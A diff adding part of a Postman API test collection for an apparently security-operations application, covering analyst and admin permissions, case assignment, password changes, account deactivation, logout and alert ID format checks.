+              "raw": "{\n  \"username\": \"{{analyst_username}}\",\n  \"password\": \"{{analyst_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('logged in as analyst', () => pm.expect(pm.response.json().role).to.eql('analyst'));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: list users -> 403",
+          "id": "c55202ce-4f8d-4a62-b259-1524fdcb6b8d",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: give own case to admin -> 403",
+          "id": "920f7428-baad-4bfe-8136-eb6145f556ed",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/{{case_full}}/assignee",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "{{case_full}}",
+                "assignee"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": {{me_id}}\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Case nelkul (IRIS nem elerheto) nincs mit hozzarendelni.",
+                  "if (!pm.collectionVariables.get('case_full')) {",
+                  "  console.warn('case_full is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 403', () => pm.response.to.have.status(403));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: release own case",
+          "id": "1f14f92a-274a-4470-97b3-075d7174f6de",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/{{case_full}}/assignee",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "{{case_full}}",
+                "assignee"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": null\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Case nelkul (IRIS nem elerheto) nincs mit hozzarendelni.",
+                  "if (!pm.collectionVariables.get('case_full')) {",
+                  "  console.warn('case_full is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('no assignee', () => pm.expect(pm.response.json().assignee).to.be.null);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: take the unassigned case",
+          "id": "8f6bbbf8-8b75-4c36-9303-17991125af03",
+          "request": {
+            "method": "PUT",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/cases/{{case_full}}/assignee",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "cases",
+                "{{case_full}}",
+                "assignee"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"user_id\": {{analyst_id}}\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "prerequest",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "// Case nelkul (IRIS nem elerheto) nincs mit hozzarendelni.",
+                  "if (!pm.collectionVariables.get('case_full')) {",
+                  "  console.warn('case_full is not set (IRIS unreachable?) - skipping');",
+                  "  pm.execution && pm.execution.skipRequest ? pm.execution.skipRequest() : null;",
+                  "}"
+                ]
+              }
+            },
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: change password with wrong current -> 400",
+          "id": "689aca0b-e1c9-400b-90aa-ef092895c2c3",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/password",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "password"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"current_password\": \"wrong-password\",\n  \"new_password\": \"Another-Pass-2!\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 400', () => pm.response.to.have.status(400));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Analyst: change password",
+          "id": "8576f75d-fde4-4d5e-a044-23dff68b87e6",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/password",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "password"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"current_password\": \"{{analyst_password}}\",\n  \"new_password\": \"Another-Pass-2!\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 204', () => pm.response.to.have.status(204));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Login as admin again",
+          "id": "4a1e5e73-29e2-4c49-9e50-6c0f99caa0ac",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Deactivate the analyst (cleanup)",
+          "id": "11b7c3ce-56d7-4b3d-af2d-4208bf891b22",
+          "request": {
+            "method": "PATCH",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/users/{{analyst_id}}",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "users",
+                "{{analyst_id}}"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"is_active\": false\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('deactivated', () => pm.expect(pm.response.json().is_active).to.be.false);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Deactivated analyst cannot log in -> 401",
+          "id": "7819dd45-2d02-4b69-965a-6fe266440496",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{analyst_username}}\",\n  \"password\": \"Another-Pass-2!\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 401', () => pm.response.to.have.status(401));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Login as admin (restore session)",
+          "id": "c63494a0-a2cb-43d5-a97f-6a1f02015d6a",
+          "request": {
+            "method": "POST",
+            "header": [
+              {
+                "key": "Content-Type",
+                "value": "application/json"
+              }
+            ],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/login",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "login"
+              ]
+            },
+            "description": "Sets the siemantics_session cookie used by the rest of the folder.",
+            "body": {
+              "mode": "raw",
+              "raw": "{\n  \"username\": \"{{ui_username}}\",\n  \"password\": \"{{ui_password}}\"\n}",
+              "options": {
+                "raw": {
+                  "language": "json"
+                }
+              }
+            }
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 200', () => pm.response.to.have.status(200));",
+                  "pm.test('session cookie set', () => pm.expect(pm.cookies.has('siemantics_session')).to.be.true);",
+                  "pm.collectionVariables.set('me_id', pm.response.json().id);"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "Logout",
+          "id": "456a95cb-7d6d-4866-b6d5-fe75adf8e36c",
+          "request": {
+            "method": "POST",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/logout",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "logout"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 204', () => pm.response.to.have.status(204));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "After logout: /auth/me -> 401",
+          "id": "265d56ac-12a7-4f39-b305-3ddccad4d24a",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/auth/me",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "auth",
+                "me"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 401', () => pm.response.to.have.status(401));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "After logout: alert list -> 401",
+          "id": "74d134ff-58e0-4da7-a077-d8b3b0e919aa",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/alerts",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "alerts"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 401', () => pm.response.to.have.status(401));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        },
+        {
+          "name": "After logout: metrics -> 401",
+          "id": "e140201e-9e04-4553-bb9d-cb914a9e3ab2",
+          "request": {
+            "method": "GET",
+            "header": [],
+            "url": {
+              "raw": "{{base_url}}/api/v1/metrics",
+              "host": [
+                "{{base_url}}"
+              ],
+              "path": [
+                "api",
+                "v1",
+                "metrics"
+              ]
+            },
+            "description": ""
+          },
+          "event": [
+            {
+              "listen": "test",
+              "script": {
+                "type": "text/javascript",
+                "exec": [
+                  "pm.test('status is 401', () => pm.response.to.have.status(401));"
+                ]
+              }
+            }
+          ],
+          "response": []
+        }
+      ]
+    }
+  ],
+  "event": [
+    {
+      "listen": "test",
+      "script": {
+        "type": "text/javascript",
+        "exec": [
+          "// Minden riasztas valaszon ellenorizzuk az ID-<szam> formatumot es elmentjuk a hivatkozast.",
+          "const path = pm.request.url.getPath();",
+          "let body = null;",
+          "try { body = pm.response.json(); } catch (e) { body = null; }",
+          "",
+          "if (pm.request.method === 'POST' && path === '/api/v1/alerts' && pm.response.code === 202 && body) {",
+          "  pm.test('[global] id is ID-<number>', () => pm.expect(body.id).to.match(/^ID-\\d+$/));",
+          "  pm.collectionVariables.set('ref_' + String(body.alert_id).replace(/[^A-Za-z0-9]/g, '_'), body.id);",
+          "  if (body.correlated_with) {",
+          "    pm.test('[global] correlated_with is ID-<number>', () => pm.expect(body.correlated_with).to.match(/^ID-\\d+$/));",
+          "  }",
+          "  if (body.status === 'escalated') {",
+          "    pm.test('[global] escalated alert has an IRIS case', () => {",
+          "      pm.expect(body.case.case_id).to.be.a('number');",
+          "      pm.expect(body.case.case_url).to.include('cid=' + body.case.case_id);",
+          "    });",
+          "  }",
+          "}",
+          "",
+          "if (path.startsWith('/api/v1/alerts') && pm.response.code === 200 && body) {",
+          "  const records = (Array.isArray(body) ? body : [body]).filter((r) => r && r.display_id !== undefined);",
+          "  if (records.length) {",
+          "    pm.test('[global] display_id is ID-<number>', () => {",
+          "      records.forEach((r) => pm.expect(r.display_id).to.match(/^ID-\\d+$/));",
+          "    });",
+          "  }",
+          "}"
+        ]
+      }
     }
   ]
 }
